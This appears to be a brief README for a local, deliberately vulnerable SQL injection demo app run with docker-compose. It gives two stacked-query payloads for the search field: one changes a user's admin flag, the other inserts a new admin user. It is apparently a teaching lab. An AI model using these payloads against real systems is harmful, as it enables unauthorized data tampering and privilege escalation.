# sql injection

not perfect\
will improve it later, mb:)

#

start
```bash
docker-compose up -d 
```

then visit http://localhost:2228


and try this out, at search input

```bash
# change admin value
kali'; UPDATE users SET admin=false WHERE username='savasick'; SELECT * FROM users WHERE username='savasick

# create new user
kali'; INSERT into users (username, admin) VALUES ('supervisor', 'True'); SELECT * FROM users WHERE username='savasick
```
